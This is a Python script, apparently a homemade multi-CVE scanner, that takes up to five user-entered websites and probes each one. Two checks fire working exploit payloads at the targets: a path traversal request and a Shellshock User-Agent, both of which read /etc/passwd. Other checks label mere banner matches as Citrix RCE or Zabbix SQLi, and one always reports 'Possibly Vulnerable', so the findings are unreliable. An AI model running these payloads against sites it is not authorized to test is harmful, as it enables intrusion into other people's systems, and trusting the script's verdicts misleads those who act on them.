import requests
from urllib.parse import urljoin
import re

headers = {
    "User-Agent": "Mozilla/5.0 (compatible; CVE-Scanner/1.0)"
}

def check_cve_2023_4591(base_url):
    test_url = f"{base_url}/index.php?page=../../../../../../etc/passwd"
    r = requests.get(test_url, headers=headers)
    if "root:x:" in r.text:
        return True
    return False

def check_cve_2023_3519(base_url):
    try:
        r = requests.get(base_url, headers=headers, timeout=5)
        if "Citrix" in r.headers.get("Server", "") or "NSC_" in r.cookies:
            return True
    except:
        pass
    return False

def check_cve_2024_50484(base_url):
    return "Manual verification required (upload test not safe here)"

def check_cve_2024_22120(base_url):
    try:
        r = requests.get(base_url, headers=headers)
        if "Zabbix" in r.text and "Server" in r.text:
            return True
    except:
        pass
    return False

def check_cve_2014_6271(base_url):
    shellshock_payload = "() { :; }; echo; echo; /bin/cat /etc/passwd"
    try:
        r = requests.get(base_url, headers={"User-Agent": shellshock_payload})
        if "root:x:" in r.text:
            return True
    except:
        pass
    return False

def scan_site(base_url):
    print(f"\n[+] Scanning {base_url}")
    results = {
        "CVE-2023-4591 (LFI in WPN-XM)": check_cve_2023_4591(base_url),
        "CVE-2023-3519 (Citrix RCE)": check_cve_2023_3519(base_url),
        "CVE-2024-50484 (MPMF Upload)": check_cve_2024_50484(base_url),
        "CVE-2024-22120 (Zabbix SQLi)": check_cve_2024_22120(base_url),
        "CVE-2014-6271 (Shellshock)": check_cve_2014_6271(base_url),
    }
    for cve, result in results.items():
        print(f"  {cve}: {'Possibly Vulnerable' if result else 'Not Detected'}")

if __name__ == "__main__":
    print("[+] Starting CVE Scanner")
    print("[+] CVE-2023-4591, CVE-2023-3519, CVE-2024-50484, CVE-2024-22120, CVE-2014-6271")
    print("[+] Maximum 5 sites at once")
    print("[+] Made by Anton Hrlic < anton-ai111")
    n=input("[+] Enter the number of sites to scan: ")
    targets = [

    ]
    if n=="5":
        for i in range(5):
            target = input(f"[+] Enter site {i+1}: ")
            targets.append(target)
        print("[+] Scanning 5 sites...")
    elif n=="4":
        for i in range(4):
            target = input(f"[+] Enter site {i+1}: ")
            targets.append(target)
        print("[+] Scanning 4 sites...")
    elif n=="3":
        for i in range(3):
            target = input(f"[+] Enter site {i+1}: ")
            targets.append(target)
        print("[+] Scanning 3 sites...")
    elif n=="2":
        for i in range(2):
            target = input(f"[+] Enter site {i+1}: ")
            targets.append(target)
        print("[+] Scanning 2 sites...")
    elif n=="1":
        target = input("[+] Enter site: ")
        targets.append(target)
        print("[+] Scanning 1 site...")
    else:
        print("[!] Invalid number of sites.")
        exit(1)
    if not targets:
        print("[!] No targets provided.")
        exit(1)
    print("[+] Scanning the following sites:")
    
    
    for site in targets:
        scan_site(site)
        print("\n[+] Scan complete.")